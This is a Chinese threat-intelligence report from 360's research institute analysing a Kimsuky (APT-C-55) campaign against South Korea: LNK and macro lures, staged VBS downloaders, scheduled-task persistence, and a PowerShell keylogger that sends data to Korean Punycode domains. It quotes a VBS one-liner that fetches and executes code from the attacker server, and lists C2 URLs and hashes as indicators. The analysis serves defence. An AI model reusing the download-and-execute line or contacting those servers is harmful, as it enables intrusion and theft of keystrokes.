> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2AnQICw1lII3j-IcKcUThw)

**APT-C-55**

  **Kimsuky**

APT-C-55（Kimsuky）组织最早由 Kaspersky 在 2013 年披露，该组织长期针对于韩国的智囊团、政府外交、新闻组织、教育学术机构等进行攻击，在过去几年里，他们将攻击目标扩大到包括美国、俄罗斯和欧洲各国在内的国家。主要目的为窃取情报、进行网络攻击活动等。该组织十分活跃，即使近几年安全厂商连续披露其攻击活动，但也未曾阻止 APT-C-55 的潜伏及攻击，其攻击活动反而有越演越烈之势。不但如此，该组织还不断开发各类攻击载荷，包括带有漏洞的 hwp 文件、恶意宏文件、释放载荷的 PE 文件、lnk 文件等。

近期，360 高级威胁研究院在日常情报挖掘中发现并捕获到了 Kimsuky 组织针对韩国地区的最新攻击行动。该组织一如既往地采用恶意宏文件、LNK 文件作为攻击入口点，诱导用户点击恶意文件，从而开启一段复杂多阶段的无文件攻击链，最终窃取用户信息。需要特别说明的是，这轮攻击中 Kimsuky 组织使用了韩文域名进行恶意载荷下载、通信，并没有使用常规的英文域名。

 **一、攻击活动分析** 
==============

**1. 攻击流程分析**          
-----------------------

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aicZ3ASUKxPOG8vVsrSGBWA6KNsDuL1ic5vJ60Zqo3WDHoexhj8j9rVDg/640?wx_fmt=png)

Kimsuky 组织以 lnk 文件为初始载荷，当点击 lnk 文件后会从自身解密释放出 VBS 脚本文件并执行，其释放脚本向服务器下载第二阶段 VBS 载荷，该载荷会继续释放 VBS 文件并注册计划任务，同时下载 Powershell 脚本负责收集信息并回传。注册的计划任务主要功能是负责下载执行后续 VBS 载荷，该 VBS 载荷从服务器下载最终的 Powershell 代码并内存执行，从而完成窃密功能。

**2. 载荷投递分析** 
--------------

本次捕获的样本信息如下所示：

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="99" valign="top"><p>MD5<o:p></o:p></p></td><td width="315" valign="top"><p>433a2a49a84545f23a038f3584f28b4a<o:p></o:p></p></td></tr><tr><td width="99" valign="top"><p>文件大小<o:p></o:p></p></td><td width="315" valign="top"><p>7.37 KB (7550 字节)<o:p></o:p></p></td></tr><tr><td width="99" valign="top"><p>文件类型<o:p></o:p></p></td><td width="315" valign="top"><p>LNK<o:p></o:p></p></td></tr></tbody></table>

对恶意 lnk 解析获取的执行参数如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aJSfaYMDwTpbHle6UtibQer70fw8F2Tq2ArAvms7c1M3FuLWIV8emJMw/640?wx_fmt=png)

可以发现 lnk 文件使用了大量不可见字符和无意义字符进行填充以此来降低受害者的防备。打开 lnk 文件的属性目标参数如下所示。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76a2yvBjicgibAyUBWV8icmAb7buh5Kx2H1nanwGqPednibV7rxGwXgibCjJ5g/640?wx_fmt=png)

目标参数实为一段 Powershell 脚本，通过读取自身并异或 0x77 进行解密，解密后以 “asdfgqwert” 为分隔符将后部分内容保存到 temp 目录下并命名为 tmp[随机数].vbs 文件。解密后的 VBS 文件如下所示。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aZHCFtkzfTKpDYw3O8GnHia2E7sy16QIicMseLmw0dytlp71zwpqzLuoA/640?wx_fmt=png)

从上可以看出 VBS 使用字符混淆，对应替换处理即可，主要功能为从地址 http://xn-vn4b27hka971hbue.kr/src/cheditor4/icons/button/upload/list.php?query=1 下载后续载荷并执行。

下载内容仍是 VBS 脚本，部分内容如下：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76a3oiadUx8QONTicAweM3CjRMr42GFJqoK22q6wxQR8hQxibTJz18RQNnxg/640?wx_fmt=png)

其功能是首先将以下字符串写入文件并保存到 %AppData%Roaming\Microsoft\Windows\Templates\OfficeAppManifest_v[Minute]_[Hour]_[Day+Month].xml（时间为当前执行时间）。

<table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="553" valign="top"><section>On Error Resume Next:With CreateObject(""InternetExplorer.Application""):.Navigate """&amp; http://xn--vn4b27hka971hbue.kr/src/cheditor4/icons/button/upload/up&amp;"/list.php?query=6"":Do while .busy:WScript.Sleep 100:Loop:bt=.Document.Body.InnerText:.Quit:End With:Execute(bt)</section></td></tr></tbody></table>

接着以 “Microsoft” 为所有者创建计划任务，并每 15 分钟利用 wscript 执行一次上述保存的 xml 文件，以此实现驻留。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aU4YmBNwQGqcFJQOmtwYDCLIevgf7G4CbAXjOs2lVT2qchUe4w8Nia6A/640?wx_fmt=png)

最后从地址 http://xn--vn4b27hka971hbue.kr/src/cheditor4/icons/button/upload/up/lib.php?idx=1 下载 Powershell 脚本负责收集主机信息并上传。

上述提到的攻击者注册的计划任务主要功能则是从 http://xn--vn4b27hka971hbue.kr/src/cheditor4/icons/button/upload/up/list.php?query=6 下载后续载荷并执行。需要注意的是，域名 xn--vn4b27hka971hbue.kr，实际是上韩文域名인쇄테이프.kr，之所以显示不一样是，是由于浏览器内置的 Punycode（RFC 3492）的算法，会将一个非英语文字转换成只包含英文和数字的另一串新文字，打开上述 URL 地址，我们可以明显看到相应韩文地址。此外，域名中的韩文 “인쇄테이프” 意为打印带，域名主页是一家名为 “汉索尔胶带” 的公司主页，猜测该网站可能被 Kimsuky 组织攻占。

![](https://mmbiz.qpic.cn/mmbiz_jpg/6CNEHNicic4PrYHU2ADAe0P49u27KdfApE1usbXMKsuWwVEmvNS9hF7TqHGSa43UJMr4S2rx0ibas2VPyYgNX7fpA/640?wx_fmt=jpeg)

接着从参数为 idx=5 的 URL 中进一步下载载荷，可以看出载荷是编码后的 Powershell 脚本。

![](https://mmbiz.qpic.cn/mmbiz_jpg/6CNEHNicic4PrYHU2ADAe0P49u27KdfApEyibqUdg6QnU5A5ZH0QhEa5N4fcnUxCTcXniagyBtDicZXgGLfxcZBIic9w/640?wx_fmt=jpeg)

1.            

2.            

**3. 攻击组件分析** 
--------------

对 URL 参数为 idx=5 的下载载荷进行解密后，发现整个文件混淆十分严重，极不利于阅读，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aICFZ6N7GYWTtk0Zicv5wTCAtC7WjV0iajdcaLx6JzOtPicSq4lsqjwoKw/640?wx_fmt=png)

经过分析去混淆后，其功能是先创建互斥体 “Global\AlreadyRunning19122”，保持单一运行，接着判断 %appdata%\Microsoft\Windows\Templates\Pages_Elements.xml 文件是否存在，若存在则读取文件内容并 Base64 编码发送至服务器 http://xn--vn4b27hka971hbue.kr/src/cheditor4/icons/button/upload/up/show.php，然后删除该文件。若不存在，则将剪切板内容和键盘记录保存至该文件，等待下次数据回传。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aTytkIA4MBk6GJ2usJweTOKncAt8UvTH3O3S9Nymgia0pVlQvqOHKHRA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76a1fHWicBLFF2efQGUZge7OqkWQA2JgUnfxB6N02NwDIsmbWic7GEV3GwA/640?wx_fmt=png)

本次下载的最终载荷功能主要是获取剪切板内容和键盘记录，回看整个攻击过程，该组织利用驻留 VBS 脚本下载并内存执行 query=6 的脚本进行攻击，由于 query=6 文件保存在服务端，并且其作用是继续下载 RUL 后缀为 idx=5 的功能载荷，结合 URL 特点来看可以猜测，攻击者只需更改服务端 query=6 文件里面的 idx 参数值就可以此控制分发不同的载荷，从而即可实施不同场景下不同需求的攻击行动。此外，该攻击手法的另一大好处是可以有效避免载荷泄露，并且发现受害者不符合攻击目标时，可以马上关闭连接。

 **二、关联分析** 
============

在今年同时期，我们也发现了 APT-C-55 组织针对韩国地区的多个恶意宏攻击样本，样本信息如下表所示：

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="99" valign="top"><p>MD5<o:p></o:p></p></td><td width="380.3333333333333" valign="top"><p>91d0b01a6a4a0b8edadf1df6a8e68d20<o:p></o:p></p><p>f2e74b749c04936cfc253e05da8de4d0<o:p></o:p></p></td></tr><tr><td width="99" valign="top"><p>文件类型<o:p></o:p></p></td><td width="400" valign="top"><p>doc<o:p></o:p></p></td></tr><tr><td width="99" valign="top"><p>C&amp;C<o:p></o:p></p></td><td width="400" valign="top"><p>http://mvix[.]xn--oi2b61z32a.xn--3e0b707e/ej/li.txt<o:p></o:p></p></td></tr></tbody></table>

APT-C-55 组织伪装成个人信息填写表诱导用户，伪装内容如下图所示：    

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aVLxqpSsqy56dEtscPR9RdjX6N4dWyOkXHxKWFGk2vD4ibnyPOl4hlicQ/640?wx_fmt=png)

用户点击并允许宏代码执行后，就会从远端韩文地址（http://mvix[.]xn--oi2b61z32a.xn--3e0b707e/ej/li.txt）下载恶意载荷并执行。需要注意的是，用户直接打开宏代码窗口时看不到任何代码，提示需要输入密码。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aiaCiaTAuAbbA4EnPaSIRCeUFnXO1s0Siaez5JU1J27zbzUrOWhA8r9Hzw/640?wx_fmt=png)

移除保护密码后，就能看到从远端下载恶意载荷的宏代码，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aFAfWQ6YFSvantj9Lia3BrBVicohbkLPgrOtD9sC4ibdelicf8uWjm01E9w/640?wx_fmt=png)

在浏览器中输入地址 http://mvix[.]xn--oi2b61z32a.xn--3e0b707e/ej/li.txt，也可以看到会显示韩文地址。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aicaK9u35eDWMI9eia1n5DED0gBZSMlbppNajqpppokJGIiaYcRic9W2KRQ/640?wx_fmt=png)

不过遗憾的是，我们并没有成功下载后续恶意载荷，猜测后续流程应该跟上述 lnk 文件类似。另外，除了上述下载恶意载荷代码外，还有通过 Selection.TypeText 监控文本输入动作的宏代码，不过攻击者并没有通过它执行关键恶意代码，在以前 Kimsuky 组织使用的宏样本中也存在过类似代码。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrAsW7ePQAOX8wNFJd6O76aXqGfAYic1cs3FgibL1stv4c0atiblfwo0q0MrCuLf9YBPHMIgLtL3kPdA/640?wx_fmt=png)

 **三、归属研判** 
============

通过分析样本，发现本轮攻击样本和 Kimsuky 组织前期攻击组件相似度较高。

1) 本次攻击整体流程与前期部分攻击样本类似，都是通过层层下载获取最终的 Powershell 代码来收集信息，Powershell 代码类似，只是字符串混淆严重。并且在下载过程中，都使用了类似 *.php？query=1, *.php？query=6, *.php？idx=1 等 C&C 格式，回传地址末尾也是 show.php，这些都跟之前 Kimsuky 组织使用的 C&C 很类似。

2) 攻击者使用的部分代码具有鲜明特点，本次捕获到的最终载荷解密后，发现通信时使用了如下的硬编码 User-Agent 发起 HTTP 请求。

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="414" valign="top"><p>Mozilla/5.0 (Windows NT 10.x; Win64; x64) AppleWebKit/537.36 (KHTML, like &nbsp;Gecko) Chremo/87.0.4280.141 Safari/537.36 Edgo/87.0.664.75<span style="font-size:12.0pt;font-family:
  仿宋;"><o:p></o:p></span></p></td></tr></tbody></table>

其中用错误的拼写 “Chremo”“Edgo” 表示 “Chrome” 和“Edge”，这里之前的 Kimsuky 组织也使用过类似 User-Agent。另外，关联分析提到的 Selection.TypeText 监控文本输入的操作，也与之前攻击宏样本类似。

3) 恶意宏样本诱饵文档信息显示为韩文，载荷通信以及下载都使用了韩文域名，再结合攻击样本来源显示为韩国，这些信息都与 APT-C-55 的攻击目标一致，且符合 APT-C-55 是一个非常了解韩语群体的特点。

综上，将本轮攻击行动归属到 APT-C-55（Kimsuky）组织。

**总结**

  

APT-C-55（Kimsuky）组织长期针对韩国政府部门进行攻击，攻击手法灵活多变，常使用社会工程学、鱼叉邮件、水坑攻击等手段投递恶意文件，并且文件类型也是多种多样，包括但不限于带有漏洞的 hwp 文件、恶意宏文件、释放载荷的 PE 文件、lnk 文件等。本次攻击中使用的 Powershell 代码进行了完全的混淆，攻击过程中又使用了韩文域名，这都表明该组织持续地进行更新恶意代码形态以及不断增加所属的域名资产。

需要说明的是，本文披露的相关恶意代码、C&C 只是 APT-C-55 组织近期部分攻击过程中的所使用的载荷，该组织不会因为一次攻击行动的暴露而停止活动，反而会持续更新其载荷。在这里提醒用户加强安全意识，不要执行未知样本、点击来历不明的链接等，否则容易在毫无防范的情况下被攻陷，进而泄漏机密文件、重要情报。

**附录 IOC**

**MD5**:

91d0b01a6a4a0b8edadf1df6a8e68d20

f2e74b749c04936cfc253e05da8de4d0

433a2a49a84545f23a038f3584f28b4a

955170427d0c4f9c23f7b8507a6003aa

86f5d04ad7c6cefd795ae717d9752737

cadbf74e83332a3bd95721a791e2f35c

8516b530ebdee3b320c7e9ca0f1fec78

**URL:**

http://mvix.xn--oi2b61z32a[.]xn--3e0b707e/ej/li.txt

http://xn--vn4b27hka971hbue[.]kr/src/cheditor4/icons/button/upload/up/list.php?query=1

http://xn--vn4b27hka971hbue[.]kr/src/cheditor4/icons/button/upload/up/list.php?query=6

http://xn--vn4b27hka971hbue[.]kr/src/cheditor4/icons/button/upload/up/lib.php?idx=5

http://xn--vn4b27hka971hbue[.]kr/src/cheditor4/icons/button/upload/up/show.php

http://partybbq.co[.]kr/src/bbs/calendar/upload/up/list.php?query=1

  

  

  

  

  

**360** **高级威胁研究院**  

360 高级威胁研究院是 360 数字安全集团的核心能力支持部门，由 360 资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的 0day 在野攻击，独家披露多个国家级 APT 组织的高级行动，赢得业内外的广泛认可，为 360 保障国家网络安全提供有力支撑。